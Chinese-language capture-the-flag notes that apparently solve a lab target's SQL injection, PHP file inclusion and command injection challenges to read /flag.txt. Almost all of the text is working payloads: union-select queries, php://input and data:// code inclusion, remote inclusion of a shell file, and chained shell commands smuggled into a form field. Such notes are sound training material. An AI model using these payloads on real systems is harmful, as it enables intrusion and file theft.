## 常规漏洞 GET flag

#### SQL injection
```
http://172.16.2.234:8011/inject.php?id=1' and 1#
http://172.16.2.234:8011/inject.php?id=1 and 1#
http://172.16.2.234:8011/inject.php?id=1 order by 5#
http://172.16.2.234:8011/inject.php?id=1 order by 3#
http://172.16.2.234:8011/inject.php?id=1 order by 4#

http://172.16.2.234:8011/inject.php?id=-1 union select null# 
http://172.16.2.234:8011/inject.php?id=-1 union select null,null# 
http://172.16.2.234:8011/inject.php?id=-1 union select null,null,null# 

http://172.16.2.234:8011/inject.php?id=-1 union select null,@@version,null#
http://172.16.2.234:8011/inject.php?id=-1 union select null,null,load_file('/flag.txt')#
```

#### 文件包含

常见包含函数有：`include()、require()、include_once()、require_once()`
区别：

include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行
require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行
require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件
`include_once()、require_once()`与(`include\require`)的功能相同,只是区别于当重复调用的时候，它只会调用一次。
```
<?php
include($_GET['filename']);    
?>
```

```
http://172.16.2.234:8011/include.php?filename=info.txt
http://172.16.2.234:8011/include.php?filename=file:///flag.txt

http://172.16.2.234:8011/include.php?filename=php://filter/convert.base64-encode/resource=/flag.txt
//读取到文件的base64编码，可用于读取php文件源码
echo "YmE2YzJkNDgzYjllZTQ5OWIwZjYxZjg4YmJlNGEzYzU="|base64 -d
ba6c2d483b9ee499b0f61f88bbe4a3c5
```
###### 下面的需要allow_url_include=On
```
//远程文件包含
http://172.16.2.234:8011/include.php?filename=[http|https|ftp|smb]://192.168.0.1/shell.txt //(需要allow_url_fopen=On并且 allow_url_include=On)

//php://input
http://172.16.2.234:8011/include.php?filename=php://input
POST: <?php echo file_get_contents("/flag.txt");?>

//data://
http://172.16.2.234:8011/include.php?filename=data://text/plain;base64,base64编码的php代码(不含结束标记?>)
echo '<?php echo file_get_contents("/flag.txt");'|base64
PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0Iik7Cg==
http://172.16.2.234:8011/include.php?filename=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0Iik7Cg==
```

#### 命令执行注入
```
http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp|ls -al

http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp|cat /flag.txt

http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp;cat /flag.txt

//& urlencode>%26
http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp %26 cat /flag.txt
POST:ipaddr=/tmp %26%26 cat /flag.txt
```


